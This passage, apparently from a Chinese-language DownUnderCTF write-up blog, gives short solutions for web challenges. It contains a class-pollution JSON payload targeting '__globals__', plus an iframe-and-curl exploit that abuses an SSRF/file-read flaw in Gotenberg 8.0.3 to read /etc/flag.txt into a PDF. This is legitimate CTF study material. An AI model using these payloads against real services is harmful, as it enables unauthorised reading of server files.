class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="string">&quot;true&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<img src="/2024/11/16/downunderctf/IMG_20241116-150552685.png" class="">  
<img src="/2024/11/16/downunderctf/IMG_20241116-150557899.png" class="">  
<h1 id="co2v2"><a href="#co2v2" class="headerlink" title="co2v2"></a>co2v2</h1><p>好吧，上次他们在flag端点上犯了一个大错误，现在我们甚至不再拥有它了。 现在是时候对他们一直在开发的一些新功能进行第二次渗透测试了。</p>
<p>看一下源码可以发现xssbot那不用想考察的肯定是xss了</p>
<h1 id="hah-got-em"><a href="#hah-got-em" class="headerlink" title="hah-got-em"></a>hah-got-em</h1><img src="/2024/11/16/downunderctf/IMG_20241116-163031346.png" class="">
<p>刚打开web页面显示not Found，看源码会发现其没有给我们源码。在看原型dockerfile会发现其只导入了一个组件<br><img src="/2024/11/16/downunderctf/IMG_20241116-163430368.png" class=""><br>gotenberg:8.0.3<br>查了原型这个组件知道我们可以通过curl来讲html，word等转为pdf。那么漏洞肯定也只能出现在这里了，查了一下可以发现其存在ssrf漏洞，那么其就会导致文件读取<br><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOTENBERGGOTENBERGV8PKGMODULESWEBHOOK-7537083">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOTENBERGGOTENBERGV8PKGMODULESWEBHOOK-7537083</a></p>
<img src="/2024/11/16/downunderctf/IMG_20241116-163014543.png" class="">  
<p>index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;\\localhost/etc/flag.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -v \</span><br><span class="line">--request POST <span class="string">&#x27;http://192.168.20.144:1337/forms/chromium/convert/html&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;files=@&quot;index.html&quot;&#x27;</span> -o output.pdf</span><br></pre></td></tr></table></figure>
<img src="/2024/11/16/downunderctf/IMG_20241116-162733136.png" class="">]]></content>
      <tags>
        <tag>wp</tag>
        <tag>复现</tag>
      </tags>
  </entry>
</search>
